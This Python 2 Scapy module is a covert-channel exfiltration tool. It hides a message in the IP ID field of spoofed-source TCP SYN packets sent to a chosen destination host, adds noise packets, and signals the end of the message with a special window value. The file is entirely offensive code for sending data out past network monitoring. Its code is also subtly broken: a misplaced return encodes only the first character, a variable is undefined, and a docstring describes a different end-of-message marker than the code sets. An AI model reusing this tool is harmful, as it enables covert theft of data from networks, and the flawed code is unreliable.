"""
This is all the functionality we need to exfiltrate a message by smuggling it
in IP packet ID numbers.  This is protocol independent since it just uses the
IP packet and not any layer 4 header.

Note that this field is only 16-bits

"""

from scapy.all import *

def add_n0ise_ipid(packet_sequence, pkt):
    """Add noise to the sequence numbers

    Args:
        pkt (Packet): Base IP packet from Scapy
        packet_sequence (int): The value of the next character
    """
    print '[*] adding n0ise to IPID..'
    # Add some randomness
    randy = random.randint(-999, 999)  # too large will produce error
    pkt.seq = packet_sequence + randy
    # Signal noisy packet
    pkt.window = int(8182) - random.randint(23, 275)
    try:
        send(pkt)
    except socket.error:
        print "\nERROR: Problem sending packets, are you root?\n"
        exit(0)



def convert_ipid(message):
    """Convert the messege, character by character, into legal values for
    the 16-bit IPID in the packet header

    Args:
        message (str): The message to convert and send

    Todo:
        Recover safely if we can't fit the message into 16-bits, currenlty
        we just set the value to magic number X
    """
    retval = []
    print '[*] converting ipid message: %s' % message
    for char in message:
        c = ord(char)
        # While we are here, might as well generate our SYN packet sequence
        # number.
        exfilChar = c * 256
        # Add to the global exfilArray.
        if is_16bit(exfilChar):
            # do nothing (refactor to if not?)
            print '[+] IPID size OK'
        else:
            print '[-] Warning: IPID int too large %d. Setting to X' % exfilChar
            exfilChar = ord(X) * 256
        retval.append(exfilChar)
        print '%s=%d, exfilChar=%d' % (char, c, exfilChar)
        return retval


def exfil_ipid(spoof, destination, dstport, message):
    """Exfiltrate a message in the 16-bit IPID value in IP headers

    Args:
        spoof (str): The spoofed source IP address
        destination (str): The destination address for the packet
        dstport (int):	The destination port for the packets
        message (str):	The message we want to exfiltrate
    Todo:
        TODO: validate value of ipid (must be a 16-bit value)
    """
    exfilArray = convert_ipid(message)
    msglen = len(exfilArray)
    print '[*] Attempting ID identification exfil..msglen', msglen
    # reset our packet
    pkt = IP(src=spoof, dst=destination) / TCP(dport=dstport, flags='S')
    i = 0
    for c in exfilArray:
        print '[*] count i:', i
        if i == msglen:
            print '[*] EOM'
        add_n0ise_ipid(exfilArray[i], pkt)
        pkt.id = exfilArray[i]
        pkt.window = 1338
        time.sleep(0.4)
        try:
            send(pkt)
        except socket.error:
            print "\nERROR: Problem sending packets, are you root?\n"
            exit(0)
        i += 1
    send_eom(pkt)

def is_16bit(input_to_check):
    """ Validate that we have a 16-bit value so it will fit into the IPID
    header

    Args:
        input_to_check (int): Integer value to check

    Returns:
        True if the value is 16-bit, False otherwise
    """
    bitl = (input_to_check).bit_length()
    if bitl <= 16:
        # print '[*] OK: int is 16bit'
        return True
    else:
        # print '[-] Warning: int is too large.'
        return False


def send_eom(pkt):
    """Send the last message, encoded with a special TTL to let
    the server know we're done.

    Set the ttl=60 to indicate end-of-message

    Args:
        pkt (Packet): Scapy packet
    """
    print '[*] Sending End-Of-Message'
    pkt.window = 7331 # It's a magical number!
    send(pkt)
